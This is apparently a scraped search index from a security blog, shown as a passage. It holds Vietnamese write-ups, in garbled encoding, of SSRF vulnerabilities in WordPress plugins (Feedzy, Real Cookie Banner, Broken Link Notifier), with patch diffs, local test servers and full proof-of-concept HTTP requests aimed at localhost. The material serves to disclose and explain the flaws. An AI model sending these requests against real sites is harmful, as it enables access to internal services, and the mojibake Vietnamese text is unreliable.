feedzy_sanitize_categories() N·∫øu h·ª£p l·ªá, k·∫øt qu·∫£ ƒë∆∞·ª£c g√°n l·∫°i cho $data['url']. ∆Øu ti√™n ch·ªçn ngu·ªìn d·ªØ li·ªáu $feed if ( ! empty( $data['url'] ) ) { $feed = $data['url']; } elseif ( ! empty( $data['category'] ) ) { $feed = $data['category']; } N·∫øu c√≥ url ‚Üí d√πng l√†m ngu·ªìn ch√≠nh. N·∫øu kh√¥ng c√≥ url ‚Üí d√πng category. ‚Üí ƒê√¢y l√† n∆°i ƒë·∫ßu v√†o ng∆∞·ªùi d√πng (url) ƒë∆∞·ª£c chuy·ªÉn ti·∫øp sang qu√° tr√¨nh fetch feed. Chu·∫©n b·ªã bi·∫øn $url $url = ''; if ( ! $feed instanceof \\WP_REST_Request ) { $url = $feed; } N·∫øu $feed kh√¥ng ph·∫£i l√† ƒë·ªëi t∆∞·ª£ng WP_REST_Request, n√≥ ƒë∆∞·ª£c g√°n cho $url. Th·ª±c t·∫ø $feed th∆∞·ªùng l√† m·ªôt chu·ªói URL ho·∫∑c m·∫£ng URL ƒë∆∞·ª£c l·∫•y t·ª´ request. G·ªçi ƒë·∫øn core function x·ª≠ l√Ω $instance = Feedzy_Rss_Feeds::instance(); $admin = $instance-\u003eget_admin(); $feed = $admin-\u003efetch_feed( $url, '12_hours', array( '' ) );","date":"2025-10-30","objectID":"/vi/posts/2025-10-30-cve-2025-11128/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/vi/posts/2025-10-30-cve-2025-11128/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"User input via /feedzy/v1/feed (REST API)\"] --\u003e B[\"feedzy_sanitize_feeds()\"]\rB --\u003e C[\"esc_url() ‚Üí no internal host validation\"]\rC --\u003e D[\"feedzy_rest_route()\"]\rD --\u003e E[\"Feedzy_Rss_Feeds::instance()\"]\rE --\u003e F[\"$admin-\u003efetch_feed(url)\"]\rF --\u003e G{\"feedzy_amazon_get_locale_hosts() exists?\"}\rG -- No --\u003e H[\"init_feed()\"]\rH --\u003e I[\"Feedzy_Rss_Feeds_Util_SimplePie::init()\"]\rI --\u003e J[\"fetch_data(cache)\"]\rJ --\u003e K[\"HTTP request to user-controlled URL ‚Üí SSRF\"]\rgraph TD\rA[\"User input via /feedzy/v1/feed (REST API)\"] --\u003e B[\"feedzy_sanitize_feeds()\"]\rB --\u003e C[\"esc_url() ‚Üí no internal host validation\"]\rC --\u003e D[\"feedzy_rest_route()\"]\rD --\u003e E[\"Feedzy_Rss_Feeds::instance()\"]\rE --\u003e F[\"$admin-\u003efetch_feed(url)\"]\rF --\u003e G{\"feedzy_amazon_get_locale_hosts() exists?\"}\rG -- No --\u003e H[\"init_feed()\"]\rH --\u003e I[\"Feedzy_Rss_Feeds_Util_SimplePie::init()\"]\rI --\u003e J[\"fetch_data(cache)\"]\rJ --\u003e K[\"HTTP request to user-controlled URL ‚Üí SSRF\"]\rgraph TD\rA[\"User input via /feedzy/v1/feed (REST API)\"] --\u003e B[\"feedzy_sanitize_feeds()\"]\rB --\u003e C[\"esc_url() ‚Üí no internal host validation\"]\rC --\u003e D[\"feedzy_rest_route()\"]\rD --\u003e E[\"Feedzy_Rss_Feeds::instance()\"]\rE --\u003e F[\"$admin-\u003efetch_feed(url)\"]\rF --\u003e G{\"feedzy_amazon_get_locale_hosts() exists?\"}\rG -- No --\u003e H[\"init_feed()\"]\rH --\u003e I[\"Feedzy_Rss_Feeds_Util_SimplePie::init()\"]\rI --\u003e J[\"fetch_data(cache)\"]\rJ --\u003e K[\"HTTP request to user-controlled URL ‚Üí SSRF\"]\rgraph TD\rA[\"User input via /feedzy/v1/feed (REST API)\"] --\u003e B[\"feedzy_sanitize_feeds()\"]\rB --\u003e C[\"esc_url() ‚Üí no internal host validation\"]\rC --\u003e D[\"feedzy_rest_route()\"]\rD --\u003e E[\"Feedzy_Rss_Feeds::instance()\"]\rE --\u003e F[\"$admin-\u003efetch_feed(url)\"]\rF --\u003e G{\"feedzy_amazon_get_locale_hosts() exists?\"}\rG -- No --\u003e H[\"init_feed()\"]\rH --\u003e I[\"Feedzy_Rss_Feeds_Util_SimplePie::init()\"]\rI --\u003e J[\"fetch_data(cache)\"]\rJ --\u003e K[\"HTTP request to user-controlled URL ‚Üí SSRF\"]\r","date":"2025-10-30","objectID":"/vi/posts/2025-10-30-cve-2025-11128/:3:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/vi/posts/2025-10-30-cve-2025-11128/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-30","objectID":"/vi/posts/2025-10-30-cve-2025-11128/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/vi/posts/2025-10-30-cve-2025-11128/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server\rT·∫°o local service ƒë∆°n gi·∫£n b·∫±ng python from flask import Flask, request, send_from_directory, Response import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/delete', methods=['GET']) def delete(): file_id = request.args.get('id') if not file_id: return \"No id provided\", 400 print(f\"delete it: {file_id}\") return f\"Delete it: {file_id}\" @app.route('/metadata') def metadata(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) @app.route('/feed', methods=['GET']) def feed(): xml_content = \"\"\"\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003crss version=\"2.0\"\u003e \u003cchannel\u003e \u003ctitle\u003eExample Feed\u003c/title\u003e \u003clink\u003ehttps://example.com\u003c/link\u003e \u003cdescription\u003eThis is a sample RSS feed generated by Flask.\u003c/description\u003e \u003citem\u003e \u003ctitle\u003eFirst item\u003c/title\u003e \u003clink\u003ehttps://example.com/item1\u003c/link\u003e \u003cdescription\u003eHello world!\u003c/description\u003e \u003c/item\u003e \u003citem\u003e \u003ctitle\u003eSecond item\u003c/title\u003e \u003clink\u003ehttps://example.com/item2\u003c/link\u003e \u003cdescription\u003eAnother entry.\u003c/description\u003e \u003c/item\u003e \u003c/channel\u003e \u003c/rss\u003e\"\"\" return Response(xml_content, mimetype='application/xml') if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-10-30","objectID":"/vi/posts/2025-10-30-cve-2025-11128/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/vi/posts/2025-10-30-cve-2025-11128/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rLogin b·∫±ng t√†i kho·∫£n Contributor G·ª≠i POST request v·ªõi URL tr·ªè ƒë·∫øn local service: POST /wp-json/feedzy/v1/feed HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://localhost/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%2Fwp-admin%2F\u0026reauth=1 Connection: keep-alive Cookie: wordpress_86a9106ae65537651a8e456835b316ab=sub%7C1761790291%7C0Q8NLwANiN0Uz0cgmvSAN6iBfEFzSylzkAkZn4kLcoG%7Cdf597bffe4c239d9e871b2ac98a2d427df0fb82dc7a09099bc026fbbff641ad1; wp-settings-time-2=1761542750; _lscache_vary=0f9122a3a07756eeee3b4199f2c151b1; wp-settings-time-3=1761591693; wp-settings-3=mfold%3Do; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=sub%7C1761790291%7C0Q8NLwANiN0Uz0cgmvSAN6iBfEFzSylzkAkZn4kLcoG%7Cd42e05305965ebb0efad0d1374e9552219c641afb6452531634d3b4e414c6a48; wp_lang=en_US url[0]=http://localhost:8001/feed\u0026category=cat Result: N·ªôi dung ƒë·ªçc ƒë∆∞·ª£c t·ª´ local service\rGhi ch√∫\rN·∫øu th·ª≠ url v·ªõi file kh√¥ng ph·∫£i d·∫°ng XML, ta nh·∫≠n ƒë∆∞·ª£c response: K·∫øt qu·∫£ khi file kh√¥ng thu·ªôc d·∫°ng XML\r","date":"2025-10-30","objectID":"/vi/posts/2025-10-30-cve-2025-11128/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/vi/posts/2025-10-30-cve-2025-11128/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng CVE-2025-11128 trong plugin Feedzy RSS Aggregator xu·∫•t ph√°t t·ª´ vi·ªác x·ª≠ l√Ω URL kh√¥ng an to√†n trong REST API /feedzy/v1/feed. H√†m feedzy_sanitize_feeds() ch·ªâ d√πng esc_url() m√† kh√¥ng x√°c minh ƒë·ªãa ch·ªâ, cho ph√©p attacker c√≥ quy·ªÅn Subscriber g·ª≠i y√™u c·∫ßu SSRF ƒë·∫øn c√°c d·ªãch v·ª• n·ªôi b·ªô. B·∫£n v√° 5.1.1 kh·∫Øc ph·ª•c b·∫±ng c√°ch s·ª≠ d·ª•ng wp_http_validate_url(), th·∫Øt ch·∫∑t quy·ªÅn truy c·∫≠p API qua current_user_can('edit_post', $post_id) v√† thay esc_url() b·∫±ng esc_url_raw(). ","date":"2025-10-30","objectID":"/vi/posts/2025-10-30-cve-2025-11128/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/vi/posts/2025-10-30-cve-2025-11128/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\resc_url() kh√¥ng ƒë·ªß ƒë·ªÉ x√°c minh URL ƒë·∫ßu v√†o. REST API c·∫ßn ƒë∆∞·ª£c gi·ªõi h·∫°n quy·ªÅn truy c·∫≠p ph√π h·ª£p. C·∫ßn x√°c minh v√† l·ªçc URL ƒë·ªÉ ngƒÉn SSRF ƒë·∫øn m·∫°ng n·ªôi b·ªô. ","date":"2025-10-30","objectID":"/vi/posts/2025-10-30-cve-2025-11128/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/vi/posts/2025-10-30-cve-2025-11128/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) ‚Äî Hacktrick WordPress Feedzy Plugin \u003c= 5.1.0 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-10-30","objectID":"/vi/posts/2025-10-30-cve-2025-11128/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/vi/posts/2025-10-30-cve-2025-11128/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Real Cookie Banner Plugin.","date":"2025-10-29","objectID":"/vi/posts/2025-10-29-cve-2025-12136/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/vi/posts/2025-10-29-cve-2025-12136/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin The Real Cookie Banner: GDPR \u0026 ePrivacy Cookie Consent cho WordPress b·ªã l·ªó h·ªïng Server-Side Request Forgery trong t·∫•t c·∫£ c√°c phi√™n b·∫£n ƒë·∫øn v√† bao g·ªìm 5.2.4. Nguy√™n nh√¢n l√† do ki·ªÉm tra kh√¥ng ƒë·∫ßy ƒë·ªß URL do ng∆∞·ªùi d√πng cung c·∫•p t·∫°i REST API endpoint /scanner/scan-without-login. ƒêi·ªÅu n√†y cho ph√©p nh·ªØng k·∫ª t·∫•n c√¥ng ƒë√£ x√°c th·ª±c, c√≥ quy·ªÅn truy c·∫≠p c·∫•p administrator tr·ªü l√™n, th·ª±c hi·ªán c√°c y√™u c·∫ßu web t·ªõi c√°c ƒë·ªãa ch·ªâ t√πy √Ω xu·∫•t ph√°t t·ª´ ·ª©ng d·ª•ng web v√† c√≥ th·ªÉ ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ truy v·∫•n v√† s·ª≠a ƒë·ªïi th√¥ng tin t·ª´ c√°c d·ªãch v·ª• n·ªôi b·ªô th√¥ng qua tham s·ªë url. CVE ID: CVE-2025-12136 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 5.2.4 Patched Versions: 5.2.5 CVSS severity: Low (5.5) Required Privilege: Administrator Product: WordPress Real Cookie Banner Plugin ","date":"2025-10-29","objectID":"/vi/posts/2025-10-29-cve-2025-12136/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/vi/posts/2025-10-29-cve-2025-12136/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Real Cookie Banner: 5.2.4 (vulnerable) v√† 5.2.5 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. ","date":"2025-10-29","objectID":"/vi/posts/2025-10-29-cve-2025-12136/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/vi/posts/2025-10-29-cve-2025-12136/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-29","objectID":"/vi/posts/2025-10-29-cve-2025-12136/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/vi/posts/2025-10-29-cve-2025-12136/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rpublic function routeScanWithoutLogin($request) { $url = $request-\u003eget_param('url'); $jobId = $request-\u003eget_param('jobId'); if ($checker-\u003estart($url, \\false)) { $requestArguments = $checker-\u003egetRequestArguments(); $result = \\wp_remote_get($url, ['redirection' =\u003e 0, 'cookies' =\u003e $requestArguments['cookies'], 'headers' =\u003e $requestArguments['headers'], 'timeout' =\u003e $requestArguments['timeout'], 'sslverify' =\u003e $requestArguments['sslverify']]); $status = \\wp_remote_retrieve_response_code($result); $ok = $status \u003e= 200 \u0026\u0026 $status \u003c 300; $location = \\wp_remote_retrieve_header($result, 'Location'); return new WP_REST_Response(['status' =\u003e $status, 'statusText' =\u003e \\wp_remote_retrieve_response_message($result), 'ok' =\u003e $ok, 'headers' =\u003e (object) \\wp_remote_retrieve_headers($result), 'redirected' =\u003e !empty($location), 'responseUrl' =\u003e $location, 'body' =\u003e \\wp_remote_retrieve_body($result)]); } else { return new WP_Error('rest_scan_without_login_error', 'Loopback request could not be started.'); } } Trong phi√™n b·∫£n l·ªói, h√†m routeScanWithoutLogin() nh·∫≠n tham s·ªë url tr·ª±c ti·∫øp t·ª´ $request-\u003eget_param('url') v√† s·ª≠ d·ª•ng n√≥ ngay trong l·ªánh wp_remote_get() m√† kh√¥ng c√≥ b·∫•t k·ª≥ c∆° ch·∫ø ki·ªÉm tra ho·∫∑c l·ªçc n√†o =\u003e ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn l·ªó h·ªïng Server-Side Request Forgery (SSRF). Ph·∫ßn tr·∫£ v·ªÅ ƒë√≥ng g√≥i to√†n b·ªô k·∫øt qu·∫£ t·ª´ wp_remote_get($url) th√†nh JSON: status, statusText: m√£ v√† th√¥ng ƒëi·ªáp HTTP. ok: true n·∫øu m√£ 2xx. headers: to√†n b·ªô header c·ªßa response. redirected, responseUrl: th√¥ng tin redirect n·∫øu c√≥. body: n·ªôi dung tr·∫£ v·ªÅ t·ª´ URL. =\u003e Server th·ª±c ch·∫•t chuy·ªÉn ti·∫øp to√†n b·ªô ph·∫£n h·ªìi t·ª´ URL n·ªôi b·ªô ra ngo√†i, g√¢y r√≤ r·ªâ d·ªØ li·ªáu khi b·ªã SSRF. public function routeScanWithoutLogin($request) { $url = $request-\u003eget_param('url'); $jobId = $request-\u003eget_param('jobId'); // Validate that the URL belongs to the jobs' domain to prevent SSRF attacks $jobDataUrl = $job-\u003edata-\u003eurl; $parsed_url = \\wp_parse_url($url); if (!$parsed_url || !isset($parsed_url['host'])) { return new WP_Error('rest_invalid_url', 'Invalid URL provided'); } $current_domain = \\wp_parse_url($jobDataUrl, \\PHP_URL_HOST); if ($parsed_url['host'] !== $current_domain) { return new WP_Error('rest_invalid_domain', 'URL must belong to the jobs\\' domain'); } if ($checker-\u003estart($url, \\false)) { $requestArguments = $checker-\u003egetRequestArguments(); $result = \\wp_remote_get($url, ['redirection' =\u003e 0, 'cookies' =\u003e $requestArguments['cookies'], 'headers' =\u003e $requestArguments['headers'], 'timeout' =\u003e $requestArguments['timeout'], 'sslverify' =\u003e $requestArguments['sslverify']]); $status = \\wp_remote_retrieve_response_code($result); $ok = $status \u003e= 200 \u0026\u0026 $status \u003c 300; $location = \\wp_remote_retrieve_header($result, 'Location'); return new WP_REST_Response(['status' =\u003e $status, 'statusText' =\u003e \\wp_remote_retrieve_response_message($result), 'ok' =\u003e $ok, 'headers' =\u003e (object) \\wp_remote_retrieve_headers($result), 'redirected' =\u003e !empty($location), 'responseUrl' =\u003e $location, 'body' =\u003e \\wp_remote_retrieve_body($result)]); } else { return new WP_Error('rest_scan_without_login_error', 'Loopback request could not be started.'); } } B·∫£n v√° ƒëa th√™m c√°c bi·ªán ph√°p x√°c th·ª±c ƒë·∫ßu v√†o ƒë·ªÉ ngƒÉn ch·∫∑n vi·ªác s·ª≠ d·ª•ng URL t√πy √Ω: Tr√≠ch xu·∫•t URL h·ª£p l·ªá c·ªßa job hi·ªán t·∫°i $jobDataUrl = $job-\u003edata-\u003eurl; =\u003e L·∫•y domain h·ª£p l·ªá m√† job ƒë∆∞·ª£c ph√©p x·ª≠ l√Ω. Ph√¢n t√≠ch v√† x√°c th·ª±c c·∫•u tr√∫c URL do ng∆∞·ªùi d√πng g·ª≠i l√™n $parsed_url = \\wp_parse_url($url); if (!$parsed_url || !isset($parsed_url['host'])) { return new WP_Error('rest_invalid_url', 'Invalid URL provided'); } =\u003e ƒê·∫£m b·∫£o URL h·ª£p l·ªá, c√≥ ph·∫ßn host. So s√°nh domain h·ª£p l·ªá v·ªõi domain c·ªßa job $current_domain = \\wp_parse_url($jobDataUrl, \\PHP_URL_HOST); if ($parsed_url['host'] !== $current_domain) { return new WP_Error('rest_invalid_domain', 'URL must belong to the jobs\\' domain'); } =\u003e N·∫øu domain kh√°c, tr·∫£ v·ªÅ l·ªói thay v√¨ ti·∫øp t·ª•c th·ª±c hi·ªán request. Gi·ªõi h·∫°n request ch·ªâ trong c√πng domain h·ª£p l·ªá, lo·∫°i b·ªè kh·∫£ nƒÉng SSRF ƒë·∫øn h·ªá th·ªëng kh√°c. ","date":"2025-10-29","objectID":"/vi/posts/2025-10-29-cve-2025-12136/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/vi/posts/2025-10-29-cve-2025-12136/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rrouteScanWithoutLogin() ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m callback cho REST API t·∫°i ƒë∆∞·ªùng d·∫´n /wp-json/\u003cnamespace\u003e/scanner/scan-without-login. register_rest_route( $namespace, '/scanner/scan-without-login', [ 'methods' =\u003e 'GET', 'callback' =\u003e [$this, 'routeScanWithoutLogin'], 'permission_callback' =\u003e [$this, 'permission_callback'], 'args' =\u003e [ 'url' =\u003e [ 'type' =\u003e 'string', 'required' =\u003e true, ], 'jobId' =\u003e [ 'type' =\u003e 'number', 'required' =\u003e true, ], ], ] ); API s·ª≠ d·ª•ng GET, y√™u c·∫ßu hai tham s·ªë b·∫Øt bu·ªôc url (string) v√† jobId (number). Quy·ªÅn truy c·∫≠p ƒë∆∞·ª£c ki·ªÉm tra qua permission_callback(): const MANAGE_MIN_CAPABILITY = 'manage_real_cookie_banner'; public function permission_callback() { return \\current_user_can(Core::MANAGE_MIN_CAPABILITY); } manage_real_cookie_banner m·∫∑c ƒë·ªãnh ch·ªâ d√†nh cho administrator, n√™n endpoint ch·ªâ c√≥ th·ªÉ g·ªçi ƒë∆∞·ª£c b·ªüi ng∆∞·ªùi d√πng c√≥ quy·ªÅn n√†y. ƒê∆∞·ªùng d·∫´n ƒë·∫ßy ƒë·ªß c·ªßa endpoint c√≥ th·ªÉ ƒë∆∞·ª£c x√°c ƒë·ªãnh b·∫±ng c√°ch truy c·∫≠p /wp-json v√† t√¨m t·ª´ kh√≥a scan-without-login thay v√¨ trace th√™m logic c·ªßa plugin. API ch·ª©a scan-without-login trong /wp-json\r=\u003e Endpoint ch√≠nh th·ª©c c·ªßa API: /wp-json/real-cookie-banner/v1/scanner/scan-without-login Ghi ch√∫\rT·ª´ job trong jobId t√¥i li√™n t∆∞·ªüng ƒë·∫øn m·ªôt c√¥ng vi·ªác ƒëang ch·∫°y v√† ƒë∆∞·ª£c tracking qua jobId. T√¥i ƒë·∫∑t ƒëi·ªÉm debug trong routeScanWithoutLogin() v√† th·ª≠ ch·ª©c nƒÉng, cho t·∫•t c·∫£ request ƒëi qua proxy BurpSuite. Scanner l√† ch·ª©c nƒÉng g·ªçi API n√†y. Debugger\rQuan s√°t trong tab HTTP history c·ªßa BurpSuite th·∫•y request ƒë·∫øn API b·ªã b·∫Øt v√† hi·ªÉn th·ªã trong HTTP History: Request ƒë·∫øn API ƒë∆∞·ª£c b·∫Øt trong HTTP History\r","date":"2025-10-29","objectID":"/vi/posts/2025-10-29-cve-2025-12136/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/vi/posts/2025-10-29-cve-2025-12136/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-29","objectID":"/vi/posts/2025-10-29-cve-2025-12136/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/vi/posts/2025-10-29-cve-2025-12136/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server\rT·∫°o local service ƒë∆°n gi·∫£n b·∫±ng python from flask import Flask, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/metadata') def test(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-10-29","objectID":"/vi/posts/2025-10-29-cve-2025-12136/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/vi/posts/2025-10-29-cve-2025-12136/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rS·ª≠ d·ª•ng ch·ª©c nƒÉng scanner v√† cho request ƒëi qua proxy BurpSuite v·ªõi ng∆∞·ªùi d√πng Administrator B·∫Øt request ƒë·∫øn endpoint /wp-json/real-cookie-banner/v1/scanner/scan-without-login Ch·ªânh s·ª≠a URL v√† g·ª≠i: GET /wp-json/real-cookie-banner/v1/scanner/scan-without-login?_v=1761578838\u0026_locale=user\u0026url=http://localhost:8001/metadata\u0026jobId=65 HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: application/json, */*;q=0.1 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://localhost/wp-admin/admin.php?page=real-cookie-banner-component X-WP-Nonce: 83df92a708 Connection: keep-alive Cookie: wp-settings-time-2=1761542750; wordpress_test_cookie=WP%20Cookie%20check; _lscache_vary=0f9122a3a07756eeee3b4199f2c151b1; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=admin%7C1761754193%7CRyskfS8SL8JqeXoDqo9gGiN5eiEbjBx5EZ73dRIjmyt%7C19f099619d5257dcc6f5828078065f2e92c2945b71c28fea0d11612e83c42ec6; wp-settings-time-1=1761581951 Result: N·ªôi dung ƒë·ªçc ƒë∆∞·ª£c t·ª´ local service\r","date":"2025-10-29","objectID":"/vi/posts/2025-10-29-cve-2025-12136/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/vi/posts/2025-10-29-cve-2025-12136/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rPhi√™n b·∫£n ‚â§ 5.2.4 c·ªßa Real Cookie Banner ch·ª©a l·ªó h·ªïng SSRF t·∫°i endpoint /wp-json/real-cookie-banner/v1/scanner/scan-without-login. H√†m routeScanWithoutLogin() nh·∫≠n url t·ª´ client r·ªìi g·ªçi wp_remote_get() v√† tr·∫£ v·ªÅ nguy√™n v·∫πn body/headers, cho ph√©p k·∫ª c√≥ quy·ªÅn Administrator (ho·∫∑c session admin b·ªã chi·∫øm) ƒë·ªçc/tra c·ª©u t√†i nguy√™n n·ªôi b·ªô. B·∫£n 5.2.5 ƒë√£ th√™m ki·ªÉm tra domain (so s√°nh host v·ªõi domain c·ªßa job) ƒë·ªÉ ngƒÉn URL ngo√†i ph·∫°m vi v√† gi·∫£m nguy c∆°; vi·ªác chuy·ªÉn sang wp_safe_remote_get() v√† b·ªï sung ki·ªÉm tra b·ªï tr·ª£ l√† c·∫ßn thi·∫øt ƒë·ªÉ b·∫£o v·ªá t·ªët h∆°n. ","date":"2025-10-29","objectID":"/vi/posts/2025-10-29-cve-2025-12136/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/vi/posts/2025-10-29-cve-2025-12136/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rC·∫≠p nh·∫≠t plugin l√™n 5.2.5+ ngay l·∫≠p t·ª©c. Kh√¥ng tin t∆∞·ªüng URL t·ª´ client ‚Äî validate/normalize v√† √°p allowlist domain tr∆∞·ªõc khi fetch. Ch·∫∑n request t·ªõi IP private/loopback sau khi resolve DNS (127.0.0.0/8, 10/8, 192.168/16, fc00::/7, v.v.). H·∫°n ch·∫ø quy·ªÅn g·ªçi endpoint; kh√¥ng c·∫•p cho t·∫•t c·∫£ user, tr√°nh __return_true. Tr√°nh forward credentials/cookies n·ªôi b·ªô; kh√¥ng tr·∫£ nguy√™n header/body th√¥ n·∫øu kh√¥ng c·∫ßn thi·∫øt. D√πng wp_safe_remote_get() k·∫øt h·ª£p ki·ªÉm tra redirect, timeout, v√† SSL; log v√† gi·ªõi h·∫°n k√≠ch th∆∞·ªõc body tr∆∞·ªõc khi tr·∫£ v·ªÅ client. ","date":"2025-10-29","objectID":"/vi/posts/2025-10-29-cve-2025-12136/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/vi/posts/2025-10-29-cve-2025-12136/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) ‚Äî Hacktrick WordPress Real Cookie Banner Plugin \u003c= 5.2.4 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-10-29","objectID":"/vi/posts/2025-10-29-cve-2025-12136/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/vi/posts/2025-10-29-cve-2025-12136/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Broken Link Notifier Plugin.","date":"2025-10-28","objectID":"/vi/posts/2025-10-28-cve-2025-6851/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/vi/posts/2025-10-28-cve-2025-6851/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Broken Link Notifier cho WordPress b·ªã l·ªó h·ªïng Server‚ÄëSide Request Forgery trong t·∫•t c·∫£ c√°c phi√™n b·∫£n ƒë·∫øn v√† bao g·ªìm 1.3.0 th√¥ng qua h√†m ajax_blinks() v·ªën cu·ªëi c√πng g·ªçi h√†m check_url_status_code(). ƒêi·ªÅu n√†y cho ph√©p attacker ch∆∞a x√°c th·ª±c (unauthenticated attackers) th·ª±c hi·ªán c√°c y√™u c·∫ßu web t·ªõi b·∫•t k·ª≥ ƒë·ªãa ch·ªâ n√†o xu·∫•t ph√°t t·ª´ ·ª©ng d·ª•ng web v√† c√≥ th·ªÉ ƒë∆∞·ª£c d√πng ƒë·ªÉ truy v·∫•n ho·∫∑c s·ª≠a ƒë·ªïi th√¥ng tin t·ª´ c√°c d·ªãch v·ª• n·ªôi b·ªô. CVE ID: CVE-2025-6851 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 1.3.0 Patched Versions: 1.3.1 CVSS severity: Medium (7.2) Required Privilege: Unauthenticated Product: WordPress Broken Link Notifier Plugin ","date":"2025-10-28","objectID":"/vi/posts/2025-10-28-cve-2025-6851/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/vi/posts/2025-10-28-cve-2025-6851/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Broken Link Notifier: 1.3.0 (vulnerable) v√† 1.3.1 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát 